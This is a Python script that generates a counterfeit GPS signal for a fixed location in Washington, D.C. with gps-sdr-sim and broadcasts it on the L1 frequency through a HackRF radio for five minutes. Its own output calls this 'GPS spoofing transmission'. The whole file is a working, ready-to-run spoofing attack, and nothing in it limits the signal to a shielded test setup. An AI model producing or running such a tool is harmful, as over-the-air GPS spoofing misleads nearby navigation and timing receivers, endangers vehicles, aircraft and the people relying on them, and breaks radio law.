import subprocess
import time
import signal
from datetime import datetime

# Step 1: Run gps-sdr-sim to generate gpssim.bin
generate_command = [
    "./gps-sdr-sim",
    "-b", "8",
    "-e", "brdc0480.25n",
    "-l", "38.8976633,-77.0365739,100"
]

# Step 2: Define HackRF transmit command
transmit_command = [
    "hackrf_transfer",
    "-t", "gpssim.bin",
    "-f", "1575420000",
    "-s", "2600000",
    "-a", "1",
    "-x", "0"
]

# Duration in seconds (5 minutes)
duration_seconds = 300

try:
    print("🛰️ Generating GPS signal binary with gps-sdr-sim...")
    result = subprocess.run(generate_command, check=True)
    print("✅ gpssim.bin generated successfully.")

    print("🚀 Starting GPS spoofing transmission for 5 minutes...")
    start_time = datetime.now()
    print(f"📅 Start time: {start_time.strftime('%Y-%m-%d %H:%M:%S')}")

    # Start the hackrf_transfer process
    process = subprocess.Popen(transmit_command)

    # Wait for the specified duration
    time.sleep(duration_seconds)

    # After 5 minutes, terminate the process
    process.send_signal(signal.SIGINT)  # Graceful stop
    process.wait()

    end_time = datetime.now()
    print(f"📅 End time: {end_time.strftime('%Y-%m-%d %H:%M:%S')}")
    print("✅ Transmission stopped after 5 minutes.")

except subprocess.CalledProcessError:
    print("❌ Failed to generate gpssim.bin. Check input files or parameters.")
except FileNotFoundError as e:
    print(f"❌ File or command not found: {e}")
except KeyboardInterrupt:
    print("⛔ Interrupted by user. Terminating transmission...")
    if 'process' in locals() and process.poll() is None:
        process.terminate()
        process.wait()
except Exception as e:
    print(f"❌ Unexpected error: {e}")
